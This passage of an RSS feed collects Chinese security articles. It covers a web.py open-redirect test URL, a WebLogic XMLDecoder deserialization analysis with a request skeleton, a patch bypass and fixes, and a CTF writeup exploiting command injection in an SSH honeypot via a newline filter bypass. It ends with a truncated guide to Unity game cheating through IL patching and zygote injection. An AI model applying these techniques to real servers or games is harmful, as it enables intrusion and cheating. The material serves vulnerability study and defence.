)
app = web.application(urls, globals())


class hello:
    def GET(self, name):
        if not name:
            name = &#39;World&#39;
        return &#39;Hello, &#39; + name + &#39;!&#39;


if __name__ == &quot;__main__&quot;:
    app.run()&lt;/code&gt;&lt;p&gt;然后模拟真实环境，创建一个static目录，和一些子目录：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;static
├── css
│   └── app.css
└── js
    └── app.js&lt;/code&gt;&lt;p&gt;运行后，直接访问&lt;code class=&quot;inline&quot;&gt;http://127.0.0.1:8080////static%2fcss%2f@www.example.com/..%2f&lt;/code&gt;即可发现已成功跳转。&lt;/p&gt;&lt;p&gt;&lt;code class=&quot;inline&quot;&gt;web.py&lt;/code&gt;的具体分析我就不多说了，由于请求必须有&lt;code class=&quot;inline&quot;&gt;/static/&lt;/code&gt;前缀，所以利用方法有些不同，不过核心原理也无差别。&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2018-01-03-32592960</guid>
<pubDate>Wed, 03 Jan 2018 00:00:00 +0800</pubDate>
</item>
<item>
<title>WebLogic WLS-WebServices组件反序列化漏洞分析</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-12-22-32267755.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/32267755&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-9c0a15dc5b98d566b7debef255ec28cc_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;       最近由于数字货币的疯涨，大量机器被入侵后用来挖矿，其中存在不少部署了Weblogic服务的机器，因为Weblogic最近所爆出安全漏洞的exploit在地下广泛流传。回到这个漏洞本身，其原因在于WLS-WebServices这个组件中，因为它使用了XMLDecoder来解析XML数据。有安全研究人员在去年八月份就向官方报告了此漏洞，Oracle官方在今年四月份提供了补丁程序。但是，四月份提供的补丁感觉是在敷衍了事，因此很快就被绕过了。为此官方又只能新发补丁，不过十月份所提供的补丁，检查还是比较严格。下面具体来看看此次反序列漏洞&lt;/p&gt;&lt;h2&gt;0x01漏洞复现&lt;/h2&gt;&lt;p&gt;测试环境 Weblogic 10.3.6.0/jdk1.6.0_45/Linux&lt;/p&gt;&lt;p&gt;漏洞POC&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;POST /wls-wsat/CoordinatorPortType11 HTTP/1.1
Host: 127.0.0.1:7001
Cache-Control: max-age=0
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36
Upgrade-Insecure-Requests: 1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
Connection: close
Content-Type: text/xml
Content-Length: 777

&amp;lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&amp;gt;   
  &amp;lt;soapenv:Header&amp;gt; 
    &amp;lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&amp;gt;  
      &amp;lt;java&amp;gt; 
        ·······
      &amp;lt;/java&amp;gt; 
    &amp;lt;/work:WorkContext&amp;gt; 
  &amp;lt;/soapenv:Header&amp;gt;  
  &amp;lt;soapenv:Body/&amp;gt; 
&amp;lt;/soapenv:Envelope&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-650fc1f00e4884b247bf8d0fb49c8586_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2862&quot; data-rawheight=&quot;1348&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-87d35ddbf6cf711302c0a2e704a90d4b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;691&quot; data-rawheight=&quot;237&quot;&gt;&lt;p&gt;在漏洞复现过程中，只需将恶意的XML数据包发送到wls-wsat此路径下的任意一个URL即可，因为后端处理流程都是一样的。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x02漏洞分析&lt;/h2&gt;&lt;p&gt;此次漏洞出现在wls-wsat.war中，此组件使用了weblogic自带的webservices处理程序来处理SOAP请求。首先在weblogic.wsee.jaxws.workcontext.WorkContextServerTube类中获取XML数据最终传递给XMLDecoder来解析，其解析XML的调用链为&lt;/p&gt;&lt;code lang=&quot;java&quot;&gt;weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest
weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld
weblogic.wsee.workarea.WorkContextXmlInputAdapter&lt;/code&gt;&lt;p&gt;首先看到weblogic.wsee.jaxws.workcontext.WorkContextServerTube.processRequest方法&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-09f77b0b1d6b41dfc5d18911bcd6745e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1724&quot; data-rawheight=&quot;608&quot;&gt;&lt;p&gt;获取到localHeader1后传递给readHeaderOld方法，其内容为&amp;lt;work:WorkContext&amp;gt;所包裹的数据，然后继续跟进weblogic.wsee.jaxws.workcontext.WorkContextTube.readHeaderOld方法&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a3cd3e829509f3fea078551540ffdfbe_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;2162&quot; data-rawheight=&quot;654&quot;&gt;&lt;p&gt;在此方法中实例化了WorkContextXmlInputAdapter类，并且将获取到的XML格式的序列化数据传递到此类的构造方法中，最后通过XMLDecoder来进行反序列化操作。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-72625de63712c5f2b3fc372250969470_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1164&quot; data-rawheight=&quot;190&quot;&gt;&lt;p&gt;关于XMLDecoder的反序化问题13年就已经被人发现，近期再次被利用到Weblogic中由此可见JAVA生态圈中的安全问题是多么糟糕。值得一提的是此次漏洞出现了两处CVE编号，因为在Oracle官方在修复CVE-2017-3506所提供的patch只是简单的检查了XML中是否包含了&amp;lt;object&amp;gt;节点，然后将&amp;lt;object&amp;gt;换为&amp;lt;void&amp;gt;即可绕过此补丁。因此在修复过程中用户一定要使用Oracle官方十月份所提供的patch。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x03漏洞修复&lt;/h2&gt;&lt;p&gt;1. 临时解决方案&lt;/p&gt;&lt;p&gt;根据业务所有需求，考虑是否删除WLS-WebServices组件。包含此组件路径为：&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
Middleware/wlserver_10.3/server/lib/wls-wsat.war&lt;/code&gt;&lt;p&gt;以上路径都在WebLogic安装处。删除以上文件之后，需重启WebLogic。确认http://weblogic_ip/wls-wsat/ 是否为404页面。&lt;/p&gt;&lt;p&gt;2. 官方补丁修复&lt;/p&gt;&lt;p&gt;前往Oracle官网下载10月份所提供的安全补丁。如需帮助请咨询info@chaitin.com。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;0x04 参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html&quot;&gt;http://blog.diniscruz.com/2013/08/using-xmldecoder-to-execute-server-side.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/pwntester/XMLDecoder&quot;&gt;pwntester/XMLDecoder&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html&quot;&gt;http://www.oracle.com/technetwork/security-advisory/cpuoct2017-3236626.html&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://open.work.weixin.qq.com/wwopen/mpnews?mixuin=3_HVCQAABwBuIkeyAAAUAA&amp;amp;mfid=WW0322-Jy56dgAABwC3hf2NINzB1w1SNvc1c&amp;amp;idx=0&amp;amp;sn=55e0f6343b34c62e1980af706e491188&quot;&gt;安全服务号&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Tomato会打字</author>
<guid isPermaLink="false">2017-12-22-32267755</guid>
<pubDate>Fri, 22 Dec 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>LCTF 2017 未解之谜：树莓派 Writeup（内附全部 Wp 链接）</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-21-31256263.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/31256263&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-ddba89a70d915f9f029d273a28ec2d1a_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;在刚刚结束的 &lt;a href=&quot;http://lctf.pwnhub.cn/&quot;&gt;LCTF 2017&lt;/a&gt; 中，仍有一些未解的题目，今天笔者就来和各位胖友分享第一道未解之谜—— Misc 类下的「树莓派」，Writeup 来自本次比赛主办方 L-Team 。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;PS: 其它未解之谜见文末链接。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;&lt;i&gt;作者：L-Team&lt;/i&gt;&lt;/b&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  刚上线&lt;/b&gt;&lt;/h2&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-1f7d0b870059146a98278673115cb54b_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1014&quot; data-rawheight=&quot;582&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ol&gt;&lt;li&gt;题目介绍只给了个 IP ，有师傅当做 Web 题，发现点不开。&lt;/li&gt;&lt;li&gt;扫了一波端口后，只有 22 开着，所以入口点肯定在这里。&lt;/li&gt;&lt;li&gt;根据题目的提示，按照正常的思维确实应该登录 `pi:raspberry` ，本来也是打算设置成这样，但是这个密码太弱了，题目还没上线就被黑铲扫了好几波，直接改密码种木马一波带走了。所以就改了一个需要一些脑洞的密码 `pi:shumeipai` ，可能有师傅在这里卡了一下。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  第一个hint&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;hint1：都告诉你密码了&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;1. 这个 hint 主要提示弱密码是什么，因为不想让师傅们耽误太多时间，给出后很多师傅都上来了。&lt;/p&gt;&lt;p&gt;2. 这时候 SSH 进去会发现是一个低权限帐号，很多操作都受限了，`uname` 看内核版本也很高，这之后很多师傅就开始四处搜刮 `flag` ，`bash_history` 、`.swp` 等等，还看了所有文件的修改时间。&lt;/p&gt;&lt;p&gt;3. 但是一番搜索后除了那个假 flag 什么发现也没有。在搜索的过程中，查看主机的网络状态`netstat -autpn`，会发现所有的 SSH 连接来源都是 `172.18.0.3` ，在这里应该会产生一些疑问，ping `172.18.0.1`、`172.18.0.3` 都是通的，pi 本机是 `172.18.0.2` 。&lt;/p&gt;&lt;p&gt;4. 这时候可以猜测，SSH连接被 `0.3` 动了手脚，通过 SSH 的指纹完全可以验证 `0.3` 是师傅们和 `0.2` 之间的中间人。&lt;/p&gt;&lt;p&gt;5. 下图是我们 SSH 连接时收到的公钥指纹&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-0b346c41cf3100d61bcfef792c2427d0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1130&quot; data-rawheight=&quot;737&quot;&gt;&lt;p&gt;6. 下图是 `172.18.0.2` 主机 SSHD 配置文件夹中的公钥:&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-60655542670698bad173a9569ccfc49d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1133&quot; data-rawheight=&quot;198&quot;&gt;&lt;p&gt;7. 可以看出两者是不一样的，所以验证了 `0.3` 在做 SSH 连接的中间人的猜测，这样一来有很大可能真的flag在 `0.3` 里。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X02  第二个hint&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;blockquote&gt;&lt;b&gt;hint：pcap&lt;/b&gt;&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;1.这是一个很重要的 hint ，流量中出现的主要IP是 `172.18.0.2` `172.18.0.3` ，在流量包里可以看到明显的特征：在建立了 SSH 连接后，外网发给 `0.3` 的加密数据包，`0.3` 会先与 `0.2` 通信，`0.2` 返回给 `0.3` 数据后，`0.3` 再返回给外网的 IP ，在这里也能够证实 `0.3` 在做 SSH 的中间人。&lt;/p&gt;&lt;p&gt;2. 一般打 CTF 的流量包里面都会藏一些有用的东西，所以这里设了个坑，下载了一个 `53.bin` ，但是文件的具体内容没有什么用，此文件实际上是之前部署在公网的蜜罐捕获到的 DDos 木马，所以先对执行了此文件的师傅说声对不起。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-acf16242ced2773eb984ab5dc848d42e_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1422&quot; data-rawheight=&quot;957&quot;&gt;&lt;p&gt;3. 但是下载这个 `53.bin` 也不完全是坑人的，流量包里的 Http 都很重要，过滤一下 Http 可以看到只有几个数据包，`User-Agent` 是 wget ，wget 了 `cip.cc` ，并重定向到了 `www.cip.cc` ，这么做的初衷了为了暴露题目的公网 IP ，但是师傅们后来决定先不放这个流量包，所以题目描述直接把 IP 给出来了，这里也没什么用了。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-2fa186d9a6b1824cfab471f752f3d04d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1517&quot; data-rawheight=&quot;719&quot;&gt;&lt;p&gt;4. 那为什么 `53.bin` 有 `request` 没有 `response` 捏，实际上 Follow 一下 TCP stream 就能看到后面的都是二进制的数据，Wireshark 没有把他们识别为 HTTP 协议。&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-62ea62905871068ed004219306d267bc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1522&quot; data-rawheight=&quot;765&quot;&gt;&lt;p&gt;5. 实际上这个包最关键的地方在下图中两个 `GET 53.bin` ，这里涉及到一些蜜罐的东西，玩过 SSH 蜜罐的师傅可能了解，入侵者下载的恶意文件很可能随着执行而自动删除，所以绝大多数 SSH 蜜罐，无论低中高交互都会有一个功能，就是碰到 wget 命令，会解析命令并自动下载里面包含的恶意文件，这也就解释了为什么 wget 命令在两台主机上都执行了一次。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-54c554af387d77a1ce13dc56cac506f4_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;886&quot; data-rawheight=&quot;43&quot;&gt;&lt;p&gt;6. 所以如果 wget 命令及参数没有解析好的话，是有可能导致命令注入的。这一点在后面的 hint 也有提示。这个漏洞我比较粗暴的设置为，当 `0.3` 主机得到了攻击者的命令，如果命令以 wget 为开头，則直接 `os.system(cmd)` ，当然还是做了一些过滤的。&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-d2509472554cb9bc404c51dc3cd77637_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;948&quot; data-rawheight=&quot;382&quot;&gt;&lt;p&gt;7. 可以看到 Shell 里常见的引入新的命令的符号大多数都做了过滤，比如 `&amp;amp; | $()` ，但是还是留下了姿势可以绕过，比如 `\n` ，&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-dda8502820250d40b96c57de63b1fdbc_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;588&quot; data-rawheight=&quot;106&quot;&gt;&lt;p&gt;8. ssh tunnel 的应用除了我们常用的 shell ，实际上还有 exec ，此应用不会在 sshd 上请求 shell ，只执行一条命令，比如 `ssh &lt;a href=&quot;mailto:pi@123.123.123.123&quot;&gt;pi@123.123.123.123&lt;/a&gt; &#39;ls&#39;`&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;9. 但为了方便构造，可以使用 python 的 `paramiko` 库来 Get flag&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-82b8817b210536f2f3f4cdc69102a75f_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1132&quot; data-rawheight=&quot;151&quot;&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-8f2d47d8b03554a8053c524b87590f05_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1129&quot; data-rawheight=&quot;284&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;10. 实际上也可以直接 Getshell&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bc55605618eabf2f967428ebbe58ef9d_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;1664&quot; data-rawheight=&quot;406&quot;&gt;&lt;h2&gt;&lt;b&gt;0X03  最后&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;1. wetland 是我之前写的一个高交互 SSH 蜜罐，基于 python 的 `paramiko` 库。这个题就是直接拿它改动了一点。地址在&lt;a href=&quot;https://github.com/ohmyadd&quot;&gt;本 github 账号&lt;/a&gt;的 wetland 仓库里。&lt;/p&gt;&lt;p&gt;2. 题目的架构为真实云主机上跑两个 Docker 容器，分别为 `wetland(172.18.0.3)` 和 `sshd(172.18.0.2)` ，其中 wetland 是蜜罐程序，sshd 用于执行黑客的命令。&lt;/p&gt;&lt;p&gt;3. 两个容器的 Dockerfile 在 docker 文件夹中，sshd 是对 `rastasheep/ubuntu-sshd` 的修改，降低了权限。wetland 是对 docker hub 上 `ohmyadd/wetland` 镜像的修改，修改了两个文件，加上了命令注入。&lt;/p&gt;&lt;p&gt;4. 最后既然是蜜罐，肯定会记录执行的操作啦，日志文件都有保留，但不知道公开合不合适，就先不放出来了。&lt;/p&gt;&lt;p&gt;5. 最后一张用 bearychat 来实时看都有什么操作 :-)&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-1a9f083ef060bf0ab80b30012d1ec9a0_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;344&quot; data-rawheight=&quot;600&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;LCTF 2017 其它未解之谜在这里&lt;/b&gt;：&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.pwnhub.cn/2017/11/21/LCTF-2017-%E6%9C%AA%E8%A7%A3%E4%B9%8B%E8%B0%9C%EF%BC%9ABeRealDriver-Writeup/&quot;&gt;LCTF 2017 未解之谜：BeRealDriver &amp;amp;&amp;amp; YublKey Writeu&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://blog.pwnhub.cn/2017/11/21/Py-trade2-Writeup/&quot;&gt;LCTF 2017 未解之谜：Py.trade2 Writeup&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;欢迎各位在评论区留言，与我们交流喔！本次比赛其它 Writeup 也将陆续发出！&lt;/p&gt;</description>
<author>perhaps</author>
<guid isPermaLink="false">2017-11-21-31256263</guid>
<pubDate>Tue, 21 Nov 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Unity游戏菜鸡玩家的制胜之路</title>
<link>https://henix.github.io/feeds/zhuanlan.chaitin-tech/2017-11-07-30703785.htm</link>
<description>&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30703785&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;title-image&quot;&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-6de83ed6f668f836c15e2e6f1b2dbf37_r.jpg&quot; alt=&quot;&quot;&gt;&lt;/div&gt;&lt;p&gt;&lt;b&gt;作者：赵奇&lt;/b&gt;&lt;/p&gt;&lt;blockquote&gt;笔者一直自认玩过不少游戏，无奈水平太菜，日常送人头。痛定思痛，决定冲(xie)冠(xiu)一(gai)怒(qi)，经过几次失败的尝试之后，终于搞定了几款时下热门的Unity游戏。出于各种原因，本文以一款不具名的国外游戏作为实例，分享笔者研究过程中的一些心得，与各位分享。&lt;/blockquote&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X00 打包党的鶸改法&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先采用最简单的打包党策略，演示一下如何快速修改一款单机游戏的金币/宝石等资源。这部分快速带过，主要负责熟悉 Unity 游戏结构，时至今日已经不算一种技术了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;首先将游戏安装 APK 解包，这里使用 apktool 或者直接看作 zip 解包是没有区别的，因为游戏严重依赖框架，Java 层和 Manifest 等文件价值不大。作为 Unity 游戏的一个特征点，可以很明显的发现这样一个文件夹。&lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-f9320e6f5de0d528d1a8bd36a5bc0e05_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;607&quot; data-rawheight=&quot;377&quot;&gt;&lt;p&gt;Assembly-CSharp.dll 等几个文件是 Unity 游戏最鲜明的特点。通过 file 或者 binwalk 查看可以发现它们是 C# 字节码格式（ IL ），这种格式如果不进行加密，可以轻松的还原 C#指令。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来在手机中安装一次游戏，看一下大致的游戏逻辑，确定需要修改什么。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-9dd04206c80d68d8d1f883a87870941e_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;999&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;看起来右上角的宝石不错。。。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;一般来说在游戏里边宝石都是稀缺资源，这里以其作为目标。为了快速定位，尝试使用 diamond ，gem 等字符串在 cs源码中进行全局搜索，很快就能定位到关键位置。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;private void SetupFirebaseDefault()
	{
		this.Defaults.Add(&quot;EnergyStart&quot;, 20);
		this.Defaults.Add(&quot;InitialEnergy&quot;, 75);
		this.Defaults.Add(&quot;EnergyFillerSecs&quot;, 420);
		this.Defaults.Add(&quot;InitialGold&quot;, 200);
		this.Defaults.Add(&quot;InitialGems&quot;, 50);
		this.Defaults.Add(&quot;XpRequirement&quot;, 75);
		this.Defaults.Add(&quot;XpReqIncremental&quot;, 75);
		this.Defaults.Add(&quot;XpAttackBonus&quot;, 5);
		this.Defaults.Add(&quot;BubblesRequired&quot;, 6);
		this.Defaults.Add(&quot;StoreBubbleCostsAddOn&quot;, 2);
		this.Defaults.Add(&quot;ReviveCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCost&quot;, 100);
		this.Defaults.Add(&quot;ShopTokenCostIncremental&quot;, 75);
		this.Defaults.Add(&quot;ShopTokenMax&quot;, 10);
		this.Defaults.Add(&quot;ShopFigMax&quot;, 3);
		this.Defaults.Add(&quot;ShopKeyMax&quot;, 5);
		this.Defaults.Add(&quot;EnergyPricesInGemsBig&quot;, 200);
		this.Defaults.Add(&quot;EnergyPricesInGemsSmall&quot;, 50);
		this.Defaults.Add(&quot;EnergyPackageBig&quot;, 60);
		this.Defaults.Add(&quot;EnergyPackageSmallMin&quot;, 5);
		this.Defaults.Add(&quot;RepeatedFigurineTokenConversion&quot;, 7);
		this.Defaults.Add(&quot;RefreshLootCost&quot;, 20);
  		...
}&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;InitialGems&lt;/b&gt; 字段明显是初始宝石数的意思，OK就它了。C# 字节码的修改有很多种方式，比较方便的工具是 Reflector ，这里因为没有这个工具，使用 ILDASM 反编译，随后修改， ILASM 重编译回去的方法。这两个工具都是微软官方提供的，当然可以百度搜到。 ILDASM 具有图形化界面，直接从其中 dump 出来即可，随后修改 dump 出的 IL 文件如下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-15e025904749d92edc40d35aa06a10e5_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1053&quot; data-rawheight=&quot;122&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;接下来使用 ILASM 命令 ilasm.exe &lt;a href=&quot;http://name.il/&quot;&gt;name.il&lt;/a&gt; /DLL 可以将 IL 文件回编译成 DLL ，将其替换 APK 包中的对应 DLL ，签名，安装之后可以发现修改生效了。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5f36c27ef8344b7b5789693438fb3de2_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;1440&quot; data-rawheight=&quot;1019&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;这就是 Unity 游戏打包党快速修改的过程，看起来很简单，但是却存在不少问题：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;这个游戏没有做任何保护，一旦存在保护，比如IL字节码加密，就需要去跟IL字节码加载的逻辑，伺机恢复明文IL字节码。&lt;/li&gt;&lt;li&gt;加壳问题，好在加壳是针对Java层的，考查了国内几款主流游戏之后发现基本没有加壳，因为壳并不能保证ELF文件的安全，ELF文件很可能使用其他安全策略。&lt;/li&gt;&lt;li&gt;重打包问题，国内游戏是不可能让你修改数据重打包的，特别是联网游戏，会有多处完整性校验，因此修改工作必须在运行过程中进行。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;综合以上，我们虽然完成了对一款毫无安全保护的 Unity 游戏的修改，但是为了进一步研究适用于更复杂条件下的修改策略，还需要进一步研究心得方案。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;0X01  注入与hook&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;考虑到国内主流游戏的安全机制，必须使用运行时修改的方式。比较理想的方式是先注入 zygote 进程。zygote 进程是 Dalvik 虚拟机的孵化器进程。众所周知，常规的 Android APP 是运行在 Dalvik 虚拟机（或者其继承者 ART ）中的，虚拟机需要加载很多运行所需的库（&lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;如&lt;/a&gt; &lt;a href=&quot;http://xn--libdvm-hh4k.so/&quot;&gt;libdvm.so&lt;/a&gt; ），并且初始化虚拟机对象。这个过程费时费力，为了保证应用的启动速度，zygote被设计为虚拟机进程的父进程。当应用启动时，直接从 zygote 上 fork() 出来，继承其虚拟内存空间。因此，注入到 zygote 进程的好处是先于应用代码执行，可以有效避免注入过程被应用的 anti-ptrace 机制检测到。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;Android 平台上的注入已经是相对成熟的一套代码，最初是由看雪版主古河大大发布，随后出现了很多的更新、优化版本。其基本思路是利用 Linux 平台上的跨进程控制机制 ptrace ，通过对 ptrace 的封装实现目标进程的读、写，寄存器获取、保存、恢复，页状态变更、写入一段施工程序、远程调用施工程序，负责将待注入模块加载到目标内存中。这些内容前人之述备矣，这里贴几个相关链接，不在做具体展开。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://bbs.pediy.com/thread-141355.htm&quot;&gt;[原创]发个Android平台上的注入代码-『Android安全』-看雪安全论坛&lt;/a&gt; libinject&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/jiayy/p/4286828.html&quot;&gt;android hook 框架 libinject2 简介、编译、运行&lt;/a&gt; 